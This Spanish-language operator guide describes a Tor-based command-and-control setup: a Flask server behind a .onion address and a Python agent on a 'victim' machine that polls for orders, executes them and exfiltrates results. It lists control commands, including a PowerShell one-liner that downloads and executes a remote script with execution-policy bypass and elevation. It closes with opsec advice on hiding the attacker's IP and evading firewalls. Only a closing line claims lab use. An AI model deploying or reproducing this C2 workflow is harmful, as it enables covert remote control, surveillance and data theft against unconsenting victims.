# Guía de Operación: Infraestructura C2 sobre Tor

Este documento detalla el funcionamiento, arquitectura y comandos del sistema de Mando y Control (C2) desarrollado para pruebas de laboratorio.

## 1. Arquitectura del Sistema
El sistema se compone de tres elementos principales que trabajan en conjunto para permitir el control remoto anónimo:

*   **Mando (Servidor):** Un servidor Flask (`server.py`) que escucha peticiones en el puerto local 5000.
*   **Transporte (Red Tor):** El servicio Tor redirige el tráfico desde una dirección `.onion` única hacia el puerto 5000 del servidor.
*   **Agente (Cliente):** Un script en Python (`client_tor.py`) que se ejecuta en la máquina objetivo y consulta al servidor cada 10 segundos a través de un proxy SOCKS5 (Tor).

---

## 2. Flujo de Ejecución

1.  **Inicio de Red:** Se lanza Tor con el archivo de configuración `torrc`. Este genera el `hostname` (.onion).
2.  **Inicio de Mando:** Se ejecuta `server.py`. Este script lee el archivo `command.txt` para obtener la siguiente orden.
3.  **Conexión del Agente:** El cliente (`client_tor.py`) lanza una petición GET a la dirección `.onion`.
4.  **Consumo de Orden:** El servidor entrega la orden al cliente y **limpia** el archivo `command.txt` (escribiendo `esperar`) para evitar ejecuciones duplicadas.
5.  **Exfiltración:** El cliente ejecuta la orden y envía el resultado (texto o archivos) mediante una petición POST al servidor.

---

## 3. Comandos de Control (Uso en `command.txt`)

Escribe estos comandos en el archivo `command.txt` para que el agente los ejecute en su siguiente ciclo de consulta:

| Función | Comando |
| :--- | :--- |
| **Captura de Pantalla** | `screenshot` |
| **Información del Sistema** | `info` |
| **Ubicación IP (Tor Exit Node)** | `location` |
| **Ejecutar Script Externo (Admin)** | `powershell -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command iex(New-Object System.Net.WebClient).DownloadString(''URL_RAW_GITHUB'')' -Verb RunAs"` |
| **Leer Log de Depuración** | `powershell -Command "Get-Content C:\Users\Public\debug_log.txt"` |
| **Verificar Estado de Defender** | `powershell -Command "Get-MpComputerStatus \| Select-Object RealTimeProtectionEnabled"` |

---

## 4. Guía de Inicio Rápido

### En la Máquina de Mando (Atacante):
1.  **Terminal 1:** `C:\Tor\tor\tor.exe -f torrc` (Esperar al 100%).
2.  **Terminal 2:** `python server.py` (Debe ejecutarse dentro de la carpeta del proyecto).
3.  **Configuración:** Editar `command.txt` con la orden deseada.

### En la Máquina Objetivo (Víctima):
1.  **Asegurar Proxy:** Tor debe estar corriendo en la máquina (puerto 9050).
2.  **Ejecutar Agente:** `python client_tor.py`.

---

## 5. Notas de Seguridad y OpSec
*   **Anonimato:** Tu IP real nunca es revelada a la víctima gracias a la red Tor.
*   **Bypass de Firewall:** El sistema utiliza conexiones salientes (Reverse Connection), lo que suele saltarse la mayoría de las reglas de firewall entrantes.
*   **Elevación de Privilegios:** El uso de `-Verb RunAs` en comandos de PowerShell disparará un aviso de UAC en la víctima a menos que el agente ya tenga privilegios de administrador.

---
*Documentación generada para uso en entornos de laboratorio controlados.*
